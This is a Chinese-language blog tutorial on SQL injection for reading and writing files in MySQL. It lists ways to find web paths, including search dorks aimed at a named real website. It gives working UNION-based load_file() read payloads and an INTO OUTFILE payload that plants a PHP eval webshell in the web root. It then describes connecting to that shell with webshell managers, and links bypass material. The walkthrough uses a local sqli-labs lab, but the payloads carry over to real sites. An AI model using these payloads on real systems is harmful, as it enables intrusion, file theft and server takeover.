# 原创
：  【SQL注入-文件读写】文件的读取+写入：函数、使用方法

# 【SQL注入-文件读写】文件的读取+写入：函数、使用方法

**目录**

[一、文件读取](#%E4%B8%80%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

[1.1、读取函数：](#1.1%E3%80%81%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0%EF%BC%9A)

[MySQL：](#MySQL%EF%BC%9A)

[1.2、流程：](#%E6%B5%81%E7%A8%8B%EF%BC%9A)

[1.3、前提：](#1.3%E3%80%81%E5%89%8D%E6%8F%90%EF%BC%9A)

[1.4、第一步：找路径：](#%E6%89%BE%E8%B7%AF%E5%BE%84%EF%BC%9A)

[方法一：](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A)

[方法二：](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A)

[方法三：](#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A)

[方法四：](#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A)

[方法五：](#%E6%96%B9%E6%B3%95%E4%BA%94%EF%BC%9A)

[方法六：](#%E6%96%B9%E6%B3%95%E5%85%AD%EF%BC%9A)

[方法七：](#%E6%96%B9%E6%B3%95%E4%B8%83%EF%BC%9A)

[1.5、第二步：执行文件的读取操作](#%E7%9F%A5%E9%81%93%E8%B7%AF%E5%BE%84%E5%90%8E%2C%E5%86%8D%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C)

[文件的读取](#%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%8F%96)

[二、文件写入：](#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%9A)

[2.1、函数：](#2.1%E3%80%81%E5%87%BD%E6%95%B0%EF%BC%9A)

[MySQL：](#MySQL%EF%BC%9A)

[2.2、可能遇见的问题](#2.2%E3%80%81%E5%8F%AF%E8%83%BD%E9%81%87%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98)

[ 问题一：](#%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A)

[问题二：](#%E9%97%AE%E9%A2%98%E4%BA%8C%EF%BC%9A)

[问题三：](#%E9%97%AE%E9%A2%98%E4%B8%89%EF%BC%9A)

[问题四：](#%E9%97%AE%E9%A2%98%E5%9B%9B%EF%BC%9A)

[2.3、使用过程：](#2.3%E3%80%81%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A)

[第一步：写入文件](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6)

[第二步：使用菜刀、蚁剑、冰蝎等工具进行连接](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E4%BD%BF%E7%94%A8%E8%8F%9C%E5%88%80%E3%80%81%E8%9A%81%E5%89%91%E3%80%81%E5%86%B0%E8%9D%8E%E7%AD%89%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5)

---


## 一、文件读取

> 
<h3>1.1、读取函数：</h3>
<h4>MySQL：</h4>
load_file()：读取函数


> 
<h3>1.2、流程：</h3>
1、找到需要读取文件所在位置，再获取路径路径
2、再执行文件的读取操作


> 
<h3>1.3、前提：</h3>
- 有权限：当前用户有权限读取文件，数据库用户有FILE权限，File_priv为yes- 服务器上：文件在服务器上（就是存在这个文件）- 路径完整：读取文件的路径要是完整的- 文件不超额：文件大小小于max_sllowed_packet- 限制：secure_file_priv值为空（若值为某目录，只能对该目录的文件操作）


> 
<h3>**1.4、第一步：找路径：**</h3>
<h4>方法一：</h4>
单引号爆出路径（报错显示）


错误参数值爆路径（报错显示）  
现在很多错了都没有回显了 


<hr/>

<h4>方法二：</h4>
通过搜索引擎获取(自我感觉效率低)
百度inurl:iqiyi.com warning
inurl:iqiyi.com `"error"(或者“fatal error”)`
<hr/>
<h4>方法三：</h4>
通过遗留的测试文件（扫描工具扫描）
**`/test``.php`**
**`/ceshi``.php`**
**`/info``.php`**
**`/phpinfo``.php`**
**`/php_info``.php`**
**`/1``.php`**
**`/x``.php`**

 （上图来自百度）
<hr/>
<h4>方法四：</h4>
通过注入点来读取文件操作来读取搭建网站平台的配置文件来获取路径
<hr/>
<h4>方法五：</h4>
通过burpsuite、sqlmap等扫描工具扫 描得到网站的map 

<hr/>

<h4>方法六：</h4>
漏洞报错，知道网站是用什么cms或者框架进行搭建的，用搜索引擎去找到对应的爆路径方式，比如phpcms 爆路径
<hr/>
<h4>方法七：</h4>
爆破:无任何突破点，就可以运用一些常见固定的可能安装位置生成字典，对目标网站进行爆破
eg：<br/> windows:d:/www/root/xxx/<br/> linux:/var/www/xxx


#### 方法二：

---


#### 方法四：

---


#### 方法六：

---


> 
<h3>**1.5、第二步：执行文件的读取操作**</h3>
<h4>文件的读取</h4>
union select 1,2,load_file('D:/test.txt')
?id=-1 union%20select 1,2,load_file(%27D:/BaiduNetdiskDownload/phpstudy/phpstudy_pro/tet.txt%27)

 （%20是换行，%27是引号，有路径时，防止转义可以将\改为\\或者/）



---


---


## 二、文件写入：

> 
<h3>2.1、函数：</h3>
<h4>MySQL：</h4>
Into Outfile（能写入多行，按格式输出）和into Dumpfile（只能写入一行且没有输出格式）


> 
<h3>2.2、可能遇见的问题</h3>
<h4> 问题一：</h4>
魔术引号（magic_quotes_gpc = On）
addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符有：<br/> 单引号（’）双引号（”）反斜杠（\）NULL

可以使用编码或宽字节绕过（附带网盘下载）
链接：https://pan.baidu.com/s/1cW_bMM3tMtNroEb-oMyPkw <br/> 提取码：hj12



<h4>问题二：</h4>
[sqli-labs靶场无法写入问题解决“ it cannot execute this statement”和“You have an error in your SQL syntax”<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://blog.csdn.net/qq_53079406/article/details/123051084?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/123051084?spm=1001.2014.3001.5501)
<h4>问题三：</h4>
[MySQL出现“Lost connection to MySQL server during query”问题分析与解决<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://blog.csdn.net/qq_53079406/article/details/123053586?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/123053586?spm=1001.2014.3001.5501)
<h4>问题四：</h4>
[解决“ERROR : (2006, ‘MySQL server has gone away”“Lost connection to MySQL server during query”错误方法<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://blog.csdn.net/qq_53079406/article/details/123056148?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/123056148?spm=1001.2014.3001.5501)



#### 问题二：

#### 问题四：

> 
<h3>2.3、使用过程：</h3>
<h4>第一步：写入文件</h4>
写入一句话木马
虽然还是报错，但是在目录下，是已经写入进去的
http://localhost:8080/sqli-labs-master/Less-7/<br/> ?id=1')) union select 1,'&lt;?php eval($_REQUEST[123]); ?&gt;',3 into outfile 'D://BaiduNetdiskDownload/phpstudy/phpstudy_pro/WWW/sqli-labs-master/1.php' --+








<hr/>
<h4>第二步：使用菜刀、蚁剑、冰蝎等工具进行连接</h4>
连接是需要知道文件路径
所以写入的的时候需要指定路径的
<hr/>
**下载、使用：**
[【WAF绕过-权限控制工具】菜刀、蚁剑、冰蝎 下载、使用方法https://blog.csdn.net/qq_53079406/article/details/124871969?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165389617516781685342067%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165389617516781685342067&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-124871969-null-null.nonecase&amp;utm_term=%E8%8F%9C%E5%88%80&amp;spm=1018.2226.3001.4450<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://blog.csdn.net/qq_53079406/article/details/124871969?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165389617516781685342067%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165389617516781685342067&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-124871969-null-null.nonecase&amp;utm_term=%E8%8F%9C%E5%88%80&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/124871969?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165389617516781685342067%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165389617516781685342067&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-124871969-null-null.nonecase&amp;utm_term=%E8%8F%9C%E5%88%80&amp;spm=1018.2226.3001.4450)

此处以蚁剑为例
添加数据 









#### 第二步：使用菜刀、蚁剑、冰蝎等工具进行连接

---

